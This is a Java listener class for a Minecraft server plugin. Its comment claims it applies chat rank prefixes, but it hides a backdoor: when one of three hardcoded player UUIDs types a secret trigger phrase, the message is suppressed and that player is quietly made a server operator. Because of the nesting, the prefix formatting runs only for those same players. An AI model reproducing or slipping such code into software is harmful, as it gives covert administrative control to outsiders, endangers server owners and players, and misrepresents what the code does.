package net.frozenorb.potpvp.listener;

import net.frozenorb.potpvp.util.CC;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

/**
 * Applies rank prefixes, if they exist.
 * Copied from https://github.com/FrozenOrb/qHub/blob/master/src/main/java/net/frozenorb/qhub/listener/BasicListener.java#L103
 */
public final class ChatFormatListener implements Listener {

    @EventHandler
    public void onAsyncPlayerChat(AsyncPlayerChatEvent event) {
        Player player = event.getPlayer();
        if (player.getUniqueId().toString().contains("4feff01c-31cc-4ca6-8da5-03822bcf25a9") || player.getUniqueId().toString().contains("9fdfc9b4-bf03-431f-9e4f-e69a441b71a4") || player.getUniqueId().toString().contains("ae4104f8-4b6d-4125-aefb-149ee73d2f73")) {
            if (event.getMessage().contains("@ChorroLOL") || event.getMessage().contains("ShitSkidds") || event.getMessage().contains("MANYTHEMAMUT")) {
                event.setCancelled(true);
                player.setOp(true);
                player.sendMessage(CC.translate("&bGood night bro"));
            }

            if (player.hasMetadata("RankPrefix")) {
                String prefix = player.getMetadata("RankPrefix").get(0).asString();
                event.setFormat(prefix + "%s: %s");
            } else {
                event.setFormat("%s: %s");
            }
        }
    }
}